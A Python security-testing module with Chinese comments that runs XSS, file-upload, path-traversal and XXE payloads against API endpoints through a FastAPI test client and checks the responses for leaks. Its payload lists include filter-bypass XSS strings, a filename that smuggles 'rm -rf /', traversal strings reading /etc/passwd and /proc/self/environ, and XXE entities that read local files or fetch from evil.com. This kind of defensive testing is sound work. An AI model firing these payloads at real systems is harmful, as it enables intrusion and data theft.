"""
漏洞測試器

此模組提供各種安全漏洞的測試功能，包括 XSS、CSRF、文件上傳等。
"""

import re
import json
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from fastapi.testclient import TestClient


@dataclass
class VulnerabilityTestResult:
    """漏洞測試結果"""

    test_name: str
    vulnerability_type: str
    endpoint: str
    method: str
    payload: Optional[str] = None
    vulnerability_detected: bool = False
    severity: str = "medium"
    description: str = ""
    evidence: Optional[str] = None
    recommendation: str = ""
    cwe_id: Optional[str] = None


class VulnerabilityTester:
    """漏洞測試器類"""

    def __init__(self):
        """初始化漏洞測試器"""
        self.xss_payloads = [
            # 基本 XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            # 事件處理器 XSS
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            # 編碼繞過
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            # JavaScript 協議
            "javascript:alert('XSS')",
            "JaVaScRiPt:alert('XSS')",
            "java\nscript:alert('XSS')",
            # 過濾器繞過
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            # DOM XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            # CSS 注入
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            # 多媒體 XSS
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
        ]

        self.file_upload_payloads = [
            # 惡意文件名
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "shell.php",
            "backdoor.jsp",
            "malware.exe",
            # 雙重擴展名
            "image.jpg.php",
            "document.pdf.jsp",
            "file.txt.exe",
            # 空字節注入
            "shell.php%00.jpg",
            "backdoor.jsp\x00.png",
            # 長文件名
            "A" * 1000 + ".txt",
            # 特殊字符
            "file<script>.txt",
            "file|command.txt",
            "file;rm -rf /.txt",
        ]

        self.path_traversal_payloads = [
            # 基本路徑遍歷
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            # 編碼繞過
            "%2e%2e%2f",
            "%2e%2e%5c",
            "..%2f",
            "..%5c",
            "%2e%2e/",
            "%2e%2e\\",
            # Unicode 編碼
            "..%c0%af",
            "..%c1%9c",
            # 雙重編碼
            "%252e%252e%252f",
            "%252e%252e%255c",
            # 16位 Unicode
            "..%u2216",
            "..%u2215",
            # 過濾器繞過
            "....//",
            "....\\\\",
            "..;/",
            "..;\\",
            # 絕對路徑
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "/proc/self/environ",
            "/proc/version",
        ]

        self.xxe_payloads = [
            # 基本 XXE
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>""",
            # 外部實體
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.xml">]>
<root>&xxe;</root>""",
            # 參數實體
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>
<root></root>""",
            # CDATA 繞過
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe "<![CDATA[file:///etc/passwd]]>">]>
<root>&xxe;</root>""",
        ]

    def test_xss_vulnerabilities(
        self,
        client: TestClient,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[VulnerabilityTestResult]:
        """
        測試 XSS 漏洞

        Args:
            client: 測試客戶端
            endpoints: 要測試的端點列表
            auth_headers: 認證標頭

        Returns:
            List[VulnerabilityTestResult]: 測試結果列表
        """
        results = []

        for endpoint in endpoints:
            url = endpoint.get("url", "/")
            method = endpoint.get("method", "GET").upper()

            for payload in self.xss_payloads:
                try:
                    response = None

                    if method == "GET":
                        params = {
                            "q": payload,
                            "search": payload,
                            "query": payload,
                            "message": payload,
                            "comment": payload,
                        }
                        response = client.get(url, params=params, headers=auth_headers)

                    elif method == "POST":
                        test_data = {
                            "content": payload,
                            "message": payload,
                            "comment": payload,
                            "description": payload,
                            "title": payload,
                            "name": payload,
                        }
                        response = client.post(
                            url, json=test_data, headers=auth_headers
                        )

                    if response:
                        vulnerability_detected, evidence = self._analyze_xss_response(
                            response, payload
                        )

                        result = VulnerabilityTestResult(
                            test_name="XSS 漏洞測試",
                            vulnerability_type="xss",
                            endpoint=url,
                            method=method,
                            payload=payload,
                            vulnerability_detected=vulnerability_detected,
                            severity="high" if vulnerability_detected else "info",
                            description="測試跨站腳本攻擊漏洞",
                            evidence=evidence,
                            recommendation=(
                                "對所有用戶輸入進行適當的轉義和驗證"
                                if vulnerability_detected
                                else ""
                            ),
                            cwe_id="CWE-79",
                        )
                        results.append(result)

                except Exception as e:
                    pass

        return results

    def test_file_upload_vulnerabilities(
        self,
        client: TestClient,
        upload_endpoints: List[str],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[VulnerabilityTestResult]:
        """
        測試文件上傳漏洞

        Args:
            client: 測試客戶端
            upload_endpoints: 文件上傳端點列表
            auth_headers: 認證標頭

        Returns:
            List[VulnerabilityTestResult]: 測試結果列表
        """
        results = []

        for endpoint in upload_endpoints:
            for filename in self.file_upload_payloads:
                try:
                    # 創建測試文件
                    file_content = b"test content"
                    if filename.endswith((".php", ".jsp", ".asp")):
                        file_content = b"<?php echo 'test'; ?>"
                    elif filename.endswith(".exe"):
                        file_content = b"MZ\x90\x00"  # PE 文件頭

                    files = {
                        "file": (filename, file_content, "application/octet-stream")
                    }
                    response = client.post(endpoint, files=files, headers=auth_headers)

                    vulnerability_detected = self._analyze_file_upload_response(
                        response, filename
                    )

                    result = VulnerabilityTestResult(
                        test_name="文件上傳漏洞測試",
                        vulnerability_type="file_upload",
                        endpoint=endpoint,
                        method="POST",
                        payload=filename,
                        vulnerability_detected=vulnerability_detected,
                        severity="high" if vulnerability_detected else "info",
                        description="測試文件上傳安全性",
                        evidence=(
                            f"文件 {filename} 上傳成功"
                            if vulnerability_detected
                            else None
                        ),
                        recommendation=(
                            "實施嚴格的文件類型檢查和文件名驗證"
                            if vulnerability_detected
                            else ""
                        ),
                        cwe_id="CWE-434",
                    )
                    results.append(result)

                except Exception as e:
                    pass

        return results

    def test_path_traversal_vulnerabilities(
        self,
        client: TestClient,
        endpoints: List[Dict[str, Any]],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[VulnerabilityTestResult]:
        """
        測試路徑遍歷漏洞

        Args:
            client: 測試客戶端
            endpoints: 要測試的端點列表
            auth_headers: 認證標頭

        Returns:
            List[VulnerabilityTestResult]: 測試結果列表
        """
        results = []

        for endpoint in endpoints:
            url = endpoint.get("url", "/")
            method = endpoint.get("method", "GET").upper()

            for payload in self.path_traversal_payloads:
                try:
                    response = None

                    if method == "GET":
                        params = {
                            "file": payload,
                            "path": payload,
                            "filename": payload,
                            "document": payload,
                        }
                        response = client.get(url, params=params, headers=auth_headers)

                    elif method == "POST":
                        test_data = {
                            "file": payload,
                            "path": payload,
                            "filename": payload,
                            "document": payload,
                        }
                        response = client.post(
                            url, json=test_data, headers=auth_headers
                        )

                    if response:
                        vulnerability_detected, evidence = (
                            self._analyze_path_traversal_response(response, payload)
                        )

                        result = VulnerabilityTestResult(
                            test_name="路徑遍歷漏洞測試",
                            vulnerability_type="path_traversal",
                            endpoint=url,
                            method=method,
                            payload=payload,
                            vulnerability_detected=vulnerability_detected,
                            severity="high" if vulnerability_detected else "info",
                            description="測試路徑遍歷攻擊漏洞",
                            evidence=evidence,
                            recommendation=(
                                "驗證和清理所有文件路徑輸入"
                                if vulnerability_detected
                                else ""
                            ),
                            cwe_id="CWE-22",
                        )
                        results.append(result)

                except Exception as e:
                    pass

        return results

    def test_xxe_vulnerabilities(
        self,
        client: TestClient,
        xml_endpoints: List[str],
        auth_headers: Optional[Dict[str, str]] = None,
    ) -> List[VulnerabilityTestResult]:
        """
        測試 XXE 漏洞

        Args:
            client: 測試客戶端
            xml_endpoints: XML 處理端點列表
            auth_headers: 認證標頭

        Returns:
            List[VulnerabilityTestResult]: 測試結果列表
        """
        results = []

        for endpoint in xml_endpoints:
            for payload in self.xxe_payloads:
                try:
                    headers = {
                        **(auth_headers or {}),
                        "Content-Type": "application/xml",
                    }
                    response = client.post(endpoint, data=payload, headers=headers)

                    vulnerability_detected, evidence = self._analyze_xxe_response(
                        response
                    )

                    result = VulnerabilityTestResult(
                        test_name="XXE 漏洞測試",
                        vulnerability_type="xxe",
                        endpoint=endpoint,
                        method="POST",
                        payload=(
                            payload[:100] + "..." if len(payload) > 100 else payload
                        ),
                        vulnerability_detected=vulnerability_detected,
                        severity="high" if vulnerability_detected else "info",
                        description="測試 XML 外部實體注入漏洞",
                        evidence=evidence,
                        recommendation=(
                            "禁用 XML 外部實體處理或使用安全的 XML 解析器"
                            if vulnerability_detected
                            else ""
                        ),
                        cwe_id="CWE-611",
                    )
                    results.append(result)

                except Exception as e:
                    pass

        return results

    def get_xss_payloads(self) -> List[str]:
        """
        獲取 XSS 測試載荷

        Returns:
            List[str]: XSS 載荷列表
        """
        return self.xss_payloads.copy()

    def get_file_upload_payloads(self) -> List[str]:
        """
        獲取文件上傳測試載荷

        Returns:
            List[str]: 文件上傳載荷列表
        """
        return self.file_upload_payloads.copy()

    def get_path_traversal_payloads(self) -> List[str]:
        """
        獲取路徑遍歷測試載荷

        Returns:
            List[str]: 路徑遍歷載荷列表
        """
        return self.path_traversal_payloads.copy()

    def get_xxe_payloads(self) -> List[str]:
        """
        獲取 XXE 測試載荷

        Returns:
            List[str]: XXE 載荷列表
        """
        return self.xxe_payloads.copy()

    def _analyze_xss_response(
        self, response, payload: str
    ) -> Tuple[bool, Optional[str]]:
        """分析 XSS 回應"""
        response_text = response.text
        content_type = response.headers.get("content-type", "").lower()

        # 檢查是否是 HTML 回應
        if "text/html" in content_type:
            # 檢查載荷是否未轉義地出現在回應中
            if payload in response_text:
                return True, f"未轉義的載荷出現在 HTML 回應中"

            # 檢查部分載荷
            dangerous_patterns = ["<script", "javascript:", "onerror=", "onload="]
            for pattern in dangerous_patterns:
                if pattern in response_text.lower():
                    return True, f"危險模式 '{pattern}' 出現在回應中"

        return False, None

    def _analyze_file_upload_response(self, response, filename: str) -> bool:
        """分析文件上傳回應"""
        # 如果上傳成功（通常是 200 或 201）
        if response.status_code in [200, 201]:
            # 檢查是否是危險文件類型
            dangerous_extensions = [".php", ".jsp", ".asp", ".exe", ".sh", ".bat"]
            for ext in dangerous_extensions:
                if filename.lower().endswith(ext):
                    return True

            # 檢查路徑遍歷
            if "../" in filename or "..\\" in filename:
                return True

        return False

    def _analyze_path_traversal_response(
        self, response, payload: str
    ) -> Tuple[bool, Optional[str]]:
        """分析路徑遍歷回應"""
        response_text = response.text

        # 檢查系統文件內容
        system_file_patterns = [
            r"root:x:0:0",  # /etc/passwd
            r"# localhost name resolution",  # hosts 文件
            r"\[boot loader\]",  # boot.ini
            r"# This file controls the state of SELinux",  # selinux config
        ]

        for pattern in system_file_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"系統文件內容洩漏: {pattern}"

        # 檢查錯誤訊息中的路徑資訊
        if "no such file or directory" in response_text.lower() and (
            "etc" in payload or "windows" in payload
        ):
            return True, "路徑遍歷嘗試的錯誤訊息"

        return False, None

    def _analyze_xxe_response(self, response) -> Tuple[bool, Optional[str]]:
        """分析 XXE 回應"""
        response_text = response.text

        # 檢查文件內容洩漏
        if "root:x:0:0" in response_text:
            return True, "/etc/passwd 文件內容洩漏"

        # 檢查 XML 解析錯誤
        xml_error_patterns = [
            "xml parsing error",
            "external entity",
            "dtd processing",
            "entity reference",
        ]

        for pattern in xml_error_patterns:
            if pattern in response_text.lower():
                return True, f"XML 處理錯誤: {pattern}"

        return False, None
